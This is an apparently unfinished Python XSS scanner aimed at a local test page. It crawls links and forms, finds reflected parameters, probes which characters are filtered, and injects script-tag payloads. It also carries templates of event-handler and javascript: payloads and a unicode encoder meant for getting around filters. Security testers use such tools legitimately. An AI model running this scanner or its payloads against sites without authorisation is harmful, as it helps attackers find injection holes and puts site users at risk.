#!/usr/bin/python
from bs4 import BeautifulSoup as bs
from urllib.parse import urlsplit
from urllib.parse import urljoin
import requests
import binascii
import random
import string
import re
import os
import sys

url = 'http://127.0.0.1/xss-example/';

common_payload = '''
(">|"/>|</[TAGNAME]>)<embed(/)[RND]src=[EVAL]>
(">|"/>|</[TAGNAME]>)<svg(/)[RND]onload=[EVAL]>
(">|"/>|</[TAGNAME]>)<style(/)[RND]onload=[EVAL]>
(">|"/>|</[TAGNAME]>)<marquee(/)[RND]onstart=[EVAL]>
(">|"/>|</[TAGNAME]>)<isindex(/)[RND](formaction)=[EVAL]>
(">|"/>|</[TAGNAME]>)<object(/)[RND](data|onerror)=[EVAL]>
(">|"/>|</[TAGNAME]>)<iframe(/)[RND]src=(EVAL|[RND]onload=[EVAL])>
(">|"/>|</[TAGNAME]>)<(video|audio)(/)[RND]src=[RND]onerror=[EVAL]>
(">|"/>|</[TAGNAME]>)<a(/)[RND](href|onmousemove|onmouseover|onclick)=[EVAL]>
(">|"/>|</[TAGNAME]>)<body(/)[RND](onload|background|onerror|onclick)=[EVAL]>
(">|"/>|</[TAGNAME]>)<var(/)[RND](onmousemove|onmouseover|onclick)=[EVAL]>[RND]
(">|"/>|</[TAGNAME]>)<script[RND]>[RND](src|onerror)=[EVAL]>[EVAL]</script[RND]>
(">|"/>|</[TAGNAME]>)<(div|span|a|[LETTER])(/)[RND](onmousemove|onmouseover|onclick)=[EVAL]>[RND]
(">|"/>|</[TAGNAME]>)<(img|image)(/)[RND]src=(EVAL|[RND])(onerror|onmouseover|onmousemove|onclick)=[EVAL]>
(">|"/>|</[TAGNAME]>)<(select|textarea|input|keygen)(/)[RND](autofocus)(onfocus|onmousemove|onmouseover|onclick)=[EVAL]>
'''
event_payload = '''
"(/)(onload|onstart|onerror|onmousemove|onmouseover|onclick|background|src|onfocus|formaction|data|)=[EVAL](//)
'''
js_payload = '''
(javascript:)alert`0`
(javascript:)prompt`0`
(javascript:)confirm`0`
(javascript:)alert(0)
(javascript:)prompt(0)
(javascript:)confirm(0)
'''

def get_dynamic_links_url(murl):
    '''
    Read dynamic links from url, only GET
    '''
    url_links = dict()
    response = requests.get(murl)
    html = bs(response.text,'html.parser')
    a = html.find_all(name='a')
    for el in a:
        parse = urlsplit(el['href'])
        query = parse[3]
        host = murl.split('//',1)[1].split('/',1)[0]
        dirname = os.path.dirname(murl.split('//',1)[1].split('/',1)[1])
        if el['href'].startswith('http'):
            url = el['href']
        elif el['href'].startswith('//'):
            url = murl.split('//',1)[0] + el['href']
        elif el['href'].startswith('/'):
            url = murl.split('//',1)[0] + '//' + host + el['href']
        else:
            url = urljoin(murl,el['href'])
        if url.find('?') != -1:
            url = url.split('?')[0]
        url = url.replace('//','/').replace('/','//',1)
        qlist = dict()
        if query:
            if query.find('&') != -1:
                for q in query.split('&'):
                    qlist[q.split('=',1)[0]] = q.split('=',1)[1]
            else:
                qlist[query.split('=',1)[0]] = query.split('=',1)[1]
            for k,_ in qlist.items():
                rnd = ''.join(random.sample(string.ascii_letters,8))
                fuzz = qlist
                fuzz[k] = rnd
                response = requests.get(url,params=fuzz)
                if response.text.find(rnd) != -1:
                    print(k,'is dynamic')
                    if not url in url_links:
                        url_links[url] = dict()
                    if not 'get' in url_links[url]:
                        url_links[url]['get'] = list()
                    url_links[url]['get'].append(k)
    return url_links


def get_dynamic_links_rest(murl):
    '''
    Read dynamic links from REST url, only GET
    '''
    pass


def get_dynamic_links_form(murl):
    '''
    Read dynmaic links from form, GET and POST
    '''
    form_links = dict()
    response = requests.get(murl)
    html = bs(response.text,'html.parser')
    form = html.find_all(name='form')
    for f in form:
        parse = urlsplit(f['action'])
        query = parse[3]
        host = murl.split('//',1)[1].split('/',1)[0]
        dirname = os.path.dirname(murl.split('//',1)[1].split('/',1)[1])
        if f['action'].startswith('http'):
            url = f['action']
        elif f['action'].startswith('//'):
            url = murl.split('//',1)[0] + f['action']
        elif f['action'].startswith('/'):
            url = murl.split('//',1)[0] + '//' + host + f['action']
        else:
            url = urljoin(murl,f['action'])
        url = url.replace('//','/').replace('/','//',1)
        tags = f.find_all(name='input')
        print('action:',url)
        print('method:',f['method'])
        if not url in form_links:
            form_links[url] = dict()
        if not f['method'] in form_links[url]:
            form_links[url][f['method']] = list()
        data = dict(zip([el['name'] for el in tags],[''.join(random.sample(string.ascii_letters,8)) for _ in tags]))
        if f['method'] == 'get':
            response = requests.get(url,params=data)
        else:
            response = requests.post(url,data=data)
        for k,v in data.items():
            if response.text.find(v) != -1:
                print(k,'is dynamic')
                form_links[url][f['method']].append(k)
    return form_links


def get_output_position(links):
    '''
    Get the output position
    '''
    plinks = dict()
    for murl,item in links.items():
        for method,params in item.items():
            if not murl in plinks:
                plinks[murl] = dict()
            if not method in plinks[murl]:
                plinks[murl][method] = dict()
            data = dict(zip(params,[''.join(random.sample(string.ascii_letters,8)) for _ in params]))
            if method == 'get':
                response = requests.get(murl,params=data)
            else:
                response = requests.post(murl,data=data)
            for k,v in data.items():
                regex_rnd = r'.*{0}.*'.format(v)
                regex_tags = r'\<.*\>.*?{0}.*?\<\/.*\>'.format(v)
                regex_attrs = r'\<.*\=\"{0}\".*\>'.format(v)
                regex_js = r'var\s.*?\=.*?\"{0}\";'.format(v)
                position = re.findall(regex_rnd,response.text)
                for pos in position:
                    if re.findall(regex_tags,pos):
                        if not 'tags' in plinks[murl][method]:
                            plinks[murl][method]['tags'] = list()
                        print(k,'output on the tags')
                        plinks[murl][method]['tags'].append(k)
                    elif re.findall(regex_attrs,pos):
                        if not 'attrs' in plinks[murl][method]:
                            plinks[murl][method]['attrs'] = list()
                        print(k,'output on the attrs')
                        plinks[murl][method]['attrs'].append(k)
                    elif re.findall(regex_js,pos):
                        if not 'js' in plinks[murl][method]:
                            plinks[murl][method]['js'] = list()
                        print(k,'output on the js')
                        plinks[murl][method]['js'].append(k)
                    else:
                        if not 'page' in plinks[murl][method]:
                            plinks[murl][method]['page'] = list()
                        print(k,'output on the page')
                        plinks[murl][method]['page'].append(k)
    return plinks

def get_xss_filter(links):
    '''
    find filtered keyword
    '''
    xlink = links
    symbols = '<>/\\\'"`();=&#\{\}+-%*:'
    for murl,mitem in links.items():
        for method,item in mitem.items():
            for pos,params in item.items():
                xlink[murl][method][pos] = dict()
                for p in params:
                    data = dict()
                    allowed = list()
                    for pp in params:
                        if pp != p:
                            data[pp] = ''.join(random.sample(string.ascii_letters,8))
                    for s in symbols:
                        rnd = ''.join(random.sample(string.ascii_letters,8))
                        data[p] = rnd + s + rnd
                        if method == 'get':
                            response = requests.get(murl,params=data)
                        else:
                            response = requests.post(murl,data=data)
                        keyword = re.findall(r'(?<={0})(.*)?(?={1})'.format(rnd,rnd),response.text)
                        if keyword:
                            for k in keyword:
                                if k == s:
                                    allowed.append(s)
                    xlink[murl][method][pos][p] = [a for a in symbols if a not in allowed] 
                    if len(allowed) == len(symbols):
                        print(p,'allowed all symbols')
                    else:
                        print(p,','.join([a for a in symbols if a not in allowed]),'filtered')
    return xlink

def encode_xss_payload(payload,enctype):
    '''
    Encode xss payload
    '''
    if enctype == 'unicode':
        epayload = ''
        for p in payload:
            epayload += '\\u00' + binascii.hexlify(p.encode('unicode-escape')).decode()
        return epayload

def automatic_gen_payload(result):
    '''
    Generate payload according to the result
    '''
    pass


def inject_xss_payload(links):
    '''
    Testing XSS vul
    '''
    for murl,mitem in links.items():
        for method,item in mitem.items():
            for pos,params in item.items():
                data = dict(zip(params,[''.join(random.sample(string.ascii_letters,8)) for _ in params]))
                if method == 'get':
                    response = requests.get(murl,params=data)
                else:
                    response = requests.post(murl,data=data)
                for k,v in data.items():
                    regex_tagname = r'(?<=\<)(.*)?(?=\>{0})'.format(v)
                    tagname = re.findall(regex_tagname,response.text)
                    for tag in tagname:
                        fuzz = data
                        payload = '</{0}><script>alert(/xss/)'.format(tag)
                        fuzz[k] = payload
                        if method == 'get':
                            response = requests.get(murl, params=fuzz)
                        else:
                            response = requests.post(murl,data=fuzz)
                        if response.text.find(payload) != -1:
                            print(k,'detect xss:',payload)


#ulinks = get_dynamic_links_url(url)
#flinks = get_dynamic_links_form(url)
#plinks1 = get_output_position(ulinks)
#plinks2 = get_output_position(flinks)
#xlinks1 = get_xss_filter(plinks1)
print(encode_xss_payload('alert(1)','unicode'))